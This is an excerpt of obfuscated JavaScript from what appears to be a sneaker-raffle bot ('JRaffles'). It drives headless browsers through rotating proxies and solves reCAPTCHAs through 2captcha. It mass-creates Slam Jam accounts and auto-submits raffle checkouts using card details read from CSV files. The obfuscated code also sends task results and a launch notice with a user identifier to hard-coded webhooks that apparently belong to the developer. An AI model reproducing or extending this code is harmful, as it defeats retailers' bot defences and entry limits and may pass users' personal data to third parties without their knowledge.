+ (_0x17339c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x450862['$eval']('.shopify-challenge__container\x20>\x20form', _0x1eac33 => _0x1eac33['submit']());
                            try {
                                await _0x450862['waitForSelector']('.product-card__image'), await _0x2bc7d2(0x1f4), _0x150a99 = 'no', console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Account\x20' + _0x5e7b19[_0x17339c]['Email'] + '\x20Generated!')), _0xd8dc96['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5e7b19[_0x17339c]['Email'] + ',' + _0x5e7b19[_0x17339c]['Password']), console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Account\x20' + _0x5e7b19[_0x17339c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xd06c6c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5e696c(_0x29936e, _0xd06c6c['succesDEVMSG']);
                            } catch (_0x1a88bd) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1a88bd));
                            }
                        } catch (_0x2e3f9a) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20' + _0x2e3f9a));
                        } finally {
                            _0x1fc7fb && _0x1fc7fb['close']();
                            if (_0x150a99 == 'yes' && _0x336152 != 0x5) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5e6003['name'] + ']\x20Task\x20' + (_0x17339c + 0x1) + '\x20:\x20Retrying')), _0x17339c = _0x17339c - 0x1, _0x336152 = _0x336152 + 0x1;
                                continue;
                            }
                            _0x150a99 == 'yes' && _0x336152 >= 0x5 && (_0x4b302f(_0x5e7b19[_0x17339c], _0x5e6003), _0x150a99 = 'no', _0x336152 = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x41a06d, _0x3313f5, _0x3bc58f) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2efa81 = 0x0; _0x2efa81 < _0x3313f5['length']; _0x2efa81++) {
                        var _0x8cb355;
                        if (_0x1ff16b != 'yes')
                            var _0x1ff16b = '', _0x4ca46d = 0x0;
                        _0x535b9c(_0x41a06d['name'] + '\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20/\x20' + _0x3313f5['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x3313f5, _0x2efa81);
                        if (_0x3313f5[_0x2efa81]['Email'] == '' || _0x3313f5[_0x2efa81]['Password'] == '' || _0x3313f5[_0x2efa81]['FirstName'] == '' || _0x3313f5[_0x2efa81]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x51046f = _0x3bc58f[_0x2efa81]['split'](':');
                        else
                            var _0x4e60c4 = Math['round'](Math['random']() * (_0x3bc58f['length'] - 0x1)), _0x51046f = _0x3bc58f[_0x4e60c4]['split'](':');
                        const _0x436bc1 = await _0x4e5975['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x51046f[0x0] + ':' + _0x51046f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x2367c0 = await _0x436bc1['newPage']();
                            await _0x2367c0['authenticate']({
                                'username': '' + _0x51046f[0x2],
                                'password': '' + _0x51046f[0x3]
                            }), await _0x2367c0['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2367c0['setRequestInterception'](!![]), _0x2367c0['on']('request', _0xb8e7f4 => {
                                _0xb8e7f4['resourceType']() === 'image' || _0xb8e7f4['resourceType']() === 'font' || _0xb8e7f4['resourceType']() === 'media' ? _0xb8e7f4['abort']() : _0xb8e7f4['continue']();
                            }), await _0x2367c0['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2367c0['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2367c0['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2bc7d2(0x258), await _0x2367c0['waitForSelector']('#CustomerEmail'), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2367c0['type']('#CustomerEmail', '' + _0x3313f5[_0x2efa81]['Email']), await _0x2bc7d2(0x12c), await _0x2367c0['type']('#CustomerPassword', '' + _0x3313f5[_0x2efa81]['Password']), await _0x2bc7d2(0x226), await _0x2367c0['$eval']('#customer_login', _0x2fb3ec => _0x2fb3ec['submit']()), await _0x2bc7d2(0x7d0), await _0x2367c0['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20' + _0x49dcd4['cyan']('Solving\x20Captcha')), await _0x2367c0['solveRecaptchas'](), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2367c0['$eval']('.shopify-challenge__container\x20>\x20form', _0x42c74b => _0x42c74b['submit']());
                            try {
                                await _0x2367c0['waitForSelector']('.nav-account'), await _0x2bc7d2(0x4b0);
                            } catch {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2367c0['goto']('' + _0x3313f5[_0x2efa81]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2bc7d2(0xbb8), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2367c0['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2367c0['click']('.product-select-variant-wrapper'), await _0x2bc7d2(0x320), await _0x2367c0['click']('li.product-select-variant__value[data-size=\x22' + _0x3313f5[_0x2efa81]['Size'] + '\x22]'), await _0x2bc7d2(0x384), await _0x2367c0['$eval']('#AddToCartForm-product-template-raffle', _0x38321d => _0x38321d['submit']()), await _0x2367c0['waitForSelector']('.cart-order-summary__content'), await _0x2bc7d2(0x514), await _0x2367c0['goto']('https://drop.slamjam.com/checkout'), await _0x2bc7d2(0x514), await _0x2367c0['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2367c0['select']('#checkout_shipping_address_country', '' + _0x3313f5[_0x2efa81]['Country']), await _0x2bc7d2(0x200), await _0x2367c0['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2367c0['type']('#checkout_shipping_address_first_name', '' + _0x3313f5[_0x2efa81]['FirstName']), await _0x2bc7d2(0x237), await _0x2367c0['type']('#checkout_shipping_address_last_name', '' + _0x3313f5[_0x2efa81]['LastName']), await _0x2bc7d2(0x1e0), await _0x2367c0['type']('#checkout_shipping_address_address1', _0x3313f5[_0x2efa81]['Address1'] + '\x20' + _0x3313f5[_0x2efa81]['HouseNumber']), await _0x2bc7d2(0x514), await _0x2367c0['type']('#checkout_shipping_address_address2', '' + _0x3313f5[_0x2efa81]['Address2']), await _0x2bc7d2(0x514);
                            _0x3313f5[_0x2efa81]['Postcode'] == undefined && (_0x3313f5[_0x2efa81]['Postcode'] = _0x3313f5[_0x2efa81]['Zip']);
                            await _0x2367c0['type']('#checkout_shipping_address_zip', '' + _0x3313f5[_0x2efa81]['Postcode']), await _0x2bc7d2(0x2bc), await _0x2367c0['type']('#checkout_shipping_address_city', '' + _0x3313f5[_0x2efa81]['City']), await _0x2bc7d2(0x320), await _0x2367c0['type']('#checkout_shipping_address_phone', '' + _0x3313f5[_0x2efa81]['Phone']), await _0x2bc7d2(0x320), await _0x2367c0['click']('#continue_button'), await _0x2bc7d2(0xbb8), await _0x2367c0['waitForSelector']('.summary-title'), await _0x2bc7d2(0x320), await _0x2367c0['click']('#continue_button'), await _0x2bc7d2(0x320), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2367c0['waitForSelector']('#checkout_credit_card_vault'), await _0x2bc7d2(0x3e8);
                            var _0x3745a6 = await _0x2367c0['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x13d226 = await _0x3745a6['contentFrame']();
                            await _0x13d226['click']('#number'), await _0x2bc7d2(0x3e8), await _0x13d226['type']('#number', '' + _0x3313f5[_0x2efa81]['CardNumber'], { 'delay': 0x78 }), _0x3745a6 = await _0x2367c0['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x13d226 = await _0x3745a6['contentFrame'](), await _0x2bc7d2(0x1c2), await _0x13d226['click']('#name'), await _0x2bc7d2(0x1f4), await _0x13d226['type']('#name', '' + _0x3313f5[_0x2efa81]['NameOnCard'], { 'delay': 0x78 }), _0x3745a6 = await _0x2367c0['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x13d226 = await _0x3745a6['contentFrame'](), await _0x2bc7d2(0x1c2), await _0x13d226['click']('#expiry'), await _0x2bc7d2(0x1f4), await _0x13d226['type']('#expiry', '' + _0x3313f5[_0x2efa81]['ExpiryDate'], { 'delay': 0x78 }), _0x3745a6 = await _0x2367c0['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x13d226 = await _0x3745a6['contentFrame'](), await _0x2bc7d2(0x1c2), await _0x13d226['click']('#verification_value'), await _0x2bc7d2(0x1f4), await _0x13d226['type']('#verification_value', '' + _0x3313f5[_0x2efa81]['CVV'], { 'delay': 0x78 }), await _0x2367c0['$eval']('#accepts-flag-raffle', _0x19729a => _0x19729a['click']()), await _0x2bc7d2(0x7d0), console['log'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2367c0['$eval']('#continue_button', _0x5c376c => _0x5c376c['click']()), await _0x2bc7d2(0x1b58), await _0x2367c0['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2367c0['$eval']('.edit_checkout.animate-floating-labels', _0x49159e => _0x49159e['submit']()), await _0x2bc7d2(0x7d0);
                            try {
                                await _0x2367c0['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1ff16b = 'no', _0x1560d5(_0x3313f5[_0x2efa81], _0x41a06d), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1a6c11) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x1a6c11['message']);
                            }
                            var _0x375c81 = await _0x1487ea(_0x3313f5[_0x2efa81], _0x41a06d, 'dev', ![]), _0x41f71c = await _0x1487ea(_0x3313f5[_0x2efa81], _0x41a06d, 'pub', ![]);
                            const _0x57e674 = {
                                'succesDEVMSG': { 'embeds': [_0x375c81] },
                                'succesPUBMSG': { 'embeds': [_0x41f71c] }
                            };
                            try {
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x57e674['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x57e674['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x3ebea8, _0x57e674['succesPUBMSG']);
                            } catch (_0x496c43) {
                                console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x496c43));
                            }
                        } catch (_0x5bd212) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20' + _0x5bd212)), _0x8cb355 = '' + _0x5bd212;
                            var _0x396612 = await _0x1487ea(kickz[_0x2efa81], _0x41a06d, 'dev', !![], _0x8cb355);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x396612] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], EMBEDS['errorDEV']), await _0x5e696c(_0x8997ff, EMBEDS['errorDEV']), _0x1ff16b = 'yes';
                        } finally {
                            _0x436bc1 && _0x436bc1['close']();
                            if (_0x1ff16b == 'yes' && _0x4ca46d != 0x5 && _0x8cb355 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x41a06d['name'] + ']\x20Task\x20' + (_0x2efa81 + 0x1) + '\x20:\x20Retrying')), _0x2efa81 = _0x2efa81 - 0x1, _0x4ca46d = _0x4ca46d + 0x1;
                                continue;
                            }
                            _0x1ff16b == 'yes' && _0x4ca46d >= 0x5 && (_0x4b302f(_0x3313f5[_0x2efa81], _0x41a06d), _0x1ff16b = 'no', _0x4ca46d = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x5d5ffd) {
                    var _0x33805e = await _0x16395f(), _0x38b287 = _0xd8dc96['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x395804 = _0x1af1e8['parse'](_0x38b287, { 'header': !![] })['data'];
                    for (var _0x3775e8 = 0x0; _0x3775e8 < _0x395804['length']; _0x3775e8++) {
                        var _0x196b34 = _0x395804[_0x3775e8]['Store'], _0x17a94f = _0x395804[_0x3775e8]['Mode'];
                        for (var _0x3b1438 of _0x3b60fe) {
                            const _0x1997e9 = _0x3b1438['name']['includes'](_0x196b34);
                            if (!_0x1997e9)
                                continue;
                            for (mode of _0x3b1438['modules']) {
                                if (mode['name'] == _0x17a94f) {
                                    console['log']('Running\x20' + _0x49dcd4['cyan'](mode['name'])), await mode['function'](mode, [_0x395804[_0x3775e8]], _0x33805e);
                                    var _0x47ed84 = _0x38b287['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0xd8dc96['writeFileSync']('../failed-tasks.csv', _0x47ed84);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5d86b7 = await _0x323b70['get']('Answer');
                    if (_0x5d86b7['Answer']['toLowerCase']() == 'y') {
                        _0xd8dc96['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x2bc7d2(0x3e8);
                        return;
                    }
                    if (_0x5d86b7['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x2bc7d2(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x2bc7d2(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x91cf2c(_0x22581c) {
    var _0x37e13b = await _0x16395f(), _0x1f6dc0 = _0xd8dc96['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3db7cf = _0x1af1e8['parse'](_0x1f6dc0, { 'header': !![] })['data'];
    for (var _0x4226a0 = 0x0; _0x4226a0 < _0x3db7cf['length']; _0x4226a0++) {
        var _0x5c7e43 = _0x3db7cf[_0x4226a0]['Store'], _0x229301 = _0x3db7cf[_0x4226a0]['Mode'];
        for (var _0x4afe50 of _0x3b60fe) {
            const _0x133d8f = _0x4afe50['name']['includes'](_0x5c7e43);
            if (_0x133d8f)
                for (mode of _0x3b60fe[_0x4afe50]['modules']) {
                    const _0x3360b4 = mode['name']['includes'](_0x229301);
                    _0x3360b4 && (_0x22581c = mode['name'], await mode['function'](_0x22581c, _0x3db7cf[_0x4226a0], _0x37e13b));
                }
        }
    }
}
async function _0x5b76d6() {
    await _0x3f0f91(), console['clear']();
    if (_0x14595d != 'devkey') {
        let _0x4e0a45 = await _0x450cc9['autoUpdate']();
        if (_0x4e0a45 === 'yes')
            return _0x1ebcc9('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x103738 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x2bc7d2(0x2710);
        ;
    }
    await _0x340225(_0x103738);
    if (_0xb22f80 === ![])
        return console['log']('Closing\x20Browser'), await _0x2bc7d2(0xbb8);
    else
        try {
            var _0x29992c = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3b1bf1
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x14595d
                    }
                ]
            }];
            const _0x25f669 = { 'embeds': _0x29992c };
            var _0x59b49d = await _0x1487ea(null, null, 'open', ![]);
            const _0x3ed0a7 = { 'openDEVMSG': { 'embeds': [_0x59b49d] } };
            await _0x5e696c(_0x554720, _0x3ed0a7['openDEVMSG']);
            async function _0x1c8dad() {
                _0x535b9c('JRaffles\x20' + _0x14595d), console['clear'](), console['log']('Welcome\x20to\x20' + _0x49dcd4['cyan']('JRaffles();') + '\x20' + _0x14595d), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x515083 = 0x0; _0x515083 < _0x3b60fe['length'] - 0x4; _0x515083++) {
                    if (_0x515083 >= 0xa) {
                        console['log']('\x20(' + _0x515083 + ')\x20[' + _0x3b60fe[_0x515083]['name'] + ']');
                        continue;
                    }
                    if (_0x3b60fe[_0x515083]['name'] === 'Reload\x20Settings' || _0x3b60fe[_0x515083]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x515083 + ')\x20\x20[' + _0x3b60fe[_0x515083]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3b60fe['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x3b60fe['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3b60fe['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3b60fe['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x5d6e01();
                if (taskModule > _0x3b60fe['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x2bc7d2(0x3e8), _0x1c8dad();
                if (_0x3b60fe[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x59738f = await _0x16395f(), _0x54985a = await _0x3e65db();
                        _0x397a11['shuffleTasks'] && await _0x437415(_0x54985a), await _0x193ca7['function'](_0x193ca7, _0x54985a, _0x59738f);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x59738f = await _0x16395f(), _0x54985a = await _0x3e65db();
                            _0x397a11['shuffleTasks'] && await _0x437415(_0x54985a), await _0x193ca7['function'](_0x193ca7, _0x54985a, _0x59738f);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x59738f = await _0x16395f();
                                await _0x193ca7['function'](_0x193ca7, _0x59738f);
                            }
                        }
                    }
                    return _0x1c8dad();
                }
                if (_0x3b60fe[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                        var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x59738f = await _0x16395f(), _0x1da5c9 = await _0x3e65db();
                            _0x397a11['shuffleTasks'] && await _0x437415(_0x1da5c9), await _0x193ca7['function'](_0x193ca7, _0x1da5c9, _0x59738f);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x59738f = await _0x16395f(), _0x1da5c9 = await _0x3e65db();
                                _0x397a11['shuffleTasks'] && await _0x437415(_0x1da5c9), await _0x193ca7['function'](_0x193ca7, _0x1da5c9, _0x59738f);
                            }
                        }
                    } catch (_0x1ca26c) {
                        console['log'](_0x1ca26c), await _0x2bc7d2(0xfa0);
                    }
                    return _0x1c8dad();
                }
                if (_0x3b60fe[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x59738f = await _0x16395f();
                        return await _0x193ca7['function'](_0x193ca7, _0x59738f), _0x1c8dad();
                    }
                    var _0x59738f = await _0x16395f(), _0x372cbb = await _0x3e65db();
                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x372cbb), await _0x193ca7['function'](_0x193ca7, _0x372cbb, _0x59738f), _0x1c8dad();
                }
                if (_0x3b60fe[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x59738f = await _0x16395f(), _0x372cbb = await _0x3e65db();
                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x372cbb), await _0x193ca7['function'](_0x193ca7, _0x372cbb, _0x59738f), _0x1c8dad();
                }
                if (_0x3b60fe[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x59738f = await _0x16395f(), _0x372cbb = await _0x3e65db();
                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x372cbb), await _0x193ca7['function'](_0x193ca7, _0x372cbb, _0x59738f), _0x1c8dad();
                } else {
                    if (_0x3b60fe[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                        var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x59738f = await _0x16395f(), _0x59605c = await _0x3e65db();
                            return _0x397a11['shuffleTasks'] && await _0x437415(_0x59605c), await _0x193ca7['function'](_0x193ca7, _0x59605c, _0x59738f), _0x1c8dad();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x59738f = await _0x16395f();
                                return await _0x193ca7['function'](_0x193ca7, null, _0x59738f), _0x1c8dad();
                            }
                        }
                        ;
                    } else {
                        if (_0x3b60fe[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                            var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction], _0x59738f = await _0x16395f(), _0x20f740 = await _0x3e65db();
                            return _0x397a11['shuffleTasks'] && await _0x437415(_0x20f740), await _0x193ca7['function'](_0x193ca7, _0x20f740, _0x59738f), await _0x2bc7d2(0x1388), _0x1c8dad();
                        } else {
                            if (_0x3b60fe[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x59738f = await _0x16395f(), _0x59605c = await _0x3e65db();
                                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x59605c), await _0x193ca7['function'](_0x193ca7, _0x59605c, _0x59738f), _0x1c8dad();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x59738f = await _0x16395f();
                                        return await _0x193ca7['function'](_0x193ca7, null, _0x59738f), _0x1c8dad();
                                    }
                                }
                                ;
                            } else {
                                if (_0x3b60fe[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x470e4e('https://bouncewear.com/nl/account/register', _0x193ca7);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3b60fe[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                        var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x59738f = await _0x16395f(), _0x3f8c8a = await _0x3e65db();
                                            return _0x397a11['shuffleTasks'] && await _0x437415(_0x3f8c8a), await _0x193ca7['function'](_0x193ca7, _0x3f8c8a, _0x59738f), _0x1c8dad();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x59738f = await _0x16395f(), _0x3f8c8a = await _0x3e65db();
                                                return _0x397a11['shuffleTasks'] && await _0x437415(_0x3f8c8a), await _0x193ca7['function'](_0x193ca7, _0x3f8c8a, _0x59738f), _0x1c8dad();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3b60fe[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                            var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x59738f = await _0x16395f(), _0x5abccd = await _0x3e65db();
                                                return _0x397a11['shuffleTasks'] && await _0x437415(_0x5abccd), await _0x193ca7['function'](_0x193ca7, _0x5abccd, _0x59738f), _0x1c8dad();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x59738f = await _0x16395f(), _0x5abccd = await _0x3e65db();
                                                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x5abccd), await _0x193ca7['function'](_0x193ca7, _0x5abccd, _0x59738f), _0x1c8dad();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3b60fe[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                                var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x59738f = await _0x16395f(), _0x5cfff0 = await _0x3e65db();
                                                    return _0x397a11['shuffleTasks'] && await _0x437415(_0x5cfff0), await _0x193ca7['function'](_0x193ca7, _0x5cfff0, _0x59738f), _0x1c8dad();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x59738f = await _0x16395f(), _0x5cfff0 = await _0x3e65db();
                                                        return _0x397a11['shuffleTasks'] && await _0x437415(_0x5cfff0), await _0x193ca7['function'](_0x193ca7, _0x5cfff0, _0x59738f), _0x1c8dad();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3b60fe[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                                    var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
